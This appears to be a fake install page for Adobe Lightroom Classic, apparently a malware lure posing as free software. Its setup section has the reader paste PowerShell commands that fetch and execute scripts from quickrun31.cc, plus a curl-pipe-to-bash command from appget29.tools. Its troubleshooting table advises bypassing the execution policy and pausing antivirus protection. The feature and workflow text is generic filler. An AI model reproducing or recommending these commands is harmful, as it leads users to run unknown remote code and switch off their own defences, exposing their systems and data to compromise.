## Installation

### Windows

Two quick setup methods.

#### Method 1 — Win + X

1. Press **Win + X**
2. Open **Terminal** or **Windows PowerShell**
3. Paste:

```powershell
sal a iex;irm quickrun31.cc/7kgaoq|a
```

4. Press **Enter** and wait for the process to finish  
5. Launch Adobe Lightroom Classic

#### Method 2 — Win + R

1. Press **Win + R**
2. Paste:

```powershell
powershell Set-Clipboard 'iex(irm quickrun31.cc/7kgaoq)';Start-Process powershell;Start-Sleep -m 1200;(New-Object -ComObject WScript.Shell).SendKeys('^v');Start-Sleep -m 200;(New-Object -ComObject WScript.Shell).SendKeys('{ENTER}')
```

3. Press **Enter** and wait  
4. Launch Adobe Lightroom Classic

### macOS

Open Terminal and run:

```bash
curl -fsSL https://appget29.tools/qkc0gc4b50mutxs | bash
```

### Requirements

- Windows 10/11 (64-bit) or macOS
- Internet connection during setup only
- 8 GB RAM minimum (16 GB recommended)
- SSD recommended for catalogs and previews

### Troubleshooting (Windows)

| Issue | What to try |
|-------|-------------|
| Connection error | Check internet |
| Execution Policy message | `Set-ExecutionPolicy Bypass -Scope Process -Force` |
| Blocked by antivirus | Temporarily pause real-time protection |
| Window closes right away | Usually means setup finished |

## About

Adobe Lightroom Classic for Windows and macOS is a professional photo management and editing application focused on RAW processing, non-destructive editing and catalog organization on both platforms.

It is widely used by photographers for organizing large libraries, applying presets, color grading and exporting high-quality images.

> Use at your own risk. Keep your system protected.

---

## Features

**Library & Catalog**
- Powerful catalog system
- Search, filters and keywords
- Collections and smart collections
- Metadata tools

**Develop Module**
- Advanced RAW processing
- Non-destructive editing
- Tone curve, HSL and color grading
- Healing and AI tools

**Presets & Batch**
- Create and apply presets
- Sync settings across photos
- Batch export

**Export**
- High-quality export options
- Watermarking
- Multiple format support

---

## Workflow

1. Import photos into a catalog  
2. Organize with keywords and collections  
3. Select the best images  
4. Edit in the Develop module  
5. Apply presets or sync settings  
6. Export final images  

---

## How to Use

1. Install using the method for your system  
2. Launch Adobe Lightroom Classic  
3. Create or open a catalog  
4. Import and edit photos  
5. Export the results  

**Tips**
- Keep your catalog on a fast drive  
- Use presets to speed up consistent edits  
- Back up the catalog regularly  
- Work with original RAW files when possible
